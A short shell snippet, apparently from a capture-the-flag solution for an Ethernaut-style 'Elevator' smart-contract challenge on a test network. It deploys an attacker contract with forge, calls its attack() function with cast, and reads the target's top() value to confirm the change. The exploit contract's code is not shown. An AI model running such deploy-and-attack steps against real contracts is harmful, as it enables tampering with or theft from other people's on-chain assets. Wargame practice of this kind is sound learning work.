# Deploying our contract
forge create --rpc-url $RINKERBY --private-key $PRIVATE_KEY src/Contract.sol:Building --constructor-args $ELEVATOR

# Calling the function to exploit
cast send 0x9de9a2b915a1f6a0352dca109d46126995550af1 --rpc-url $RINKERBY --private-key $PRIVATE_KEY "attack()" --gas 300000

# Confirming that the variable has been changed
cast call $ELEVATOR --rpc-url $RINKERBY "top()"
